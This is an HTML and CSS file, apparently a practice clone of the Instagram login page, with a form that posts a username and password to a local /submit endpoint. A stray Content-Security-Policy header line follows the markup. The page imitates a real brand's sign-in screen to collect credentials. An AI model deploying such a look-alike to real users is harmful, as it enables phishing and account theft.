<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <style>
        /* Basic reset and body styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: black;  /* Changed background to black */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;  /* Set text color to white to contrast against the black background */
        }

        /* Main container */
        .login-container {
            width: 350px;
            padding: 30px;
            background-color: white;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
        }

        /* Instagram logo */
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }

        /* Input fields */
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 14px;
        }

        /* Button style */
        button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;  /* Instagram blue */
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        /* Green hover effect for the login button */
        button:hover {
            background-color: green;  /* Change background to green on hover */
        }

        /* Footer link styles */
        .footer {
            margin-top: 20px;
        }

        .footer a {
            font-size: 12px;
            color: #8e8e8e;  /* Default link color */
            text-decoration: none;
        }

        /* Red hover effect for the link */
        .footer a:hover {
            color: red;  /* Change text color to red when hovered */
            text-decoration: underline;
        }

        /* Optional: Add a little margin for smaller devices */
        @media (max-width: 400px) {
            .login-container {
                width: 90%;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Instagram logo -->
        <div class="logo">
            <!-- Add Instagram logo image URL here -->
        </div>
        
        <!-- Login Form -->
        <form action="/submit" method="post">
            <input type="text" name="username" placeholder="Phone, email, or username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log in</button>
        </form>

        <!-- Forgot Password Link -->
        <div class="footer">
            <a href="password-reset.html">Forgot password?</a>
        </div>
    </div>

</body>
</html>
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
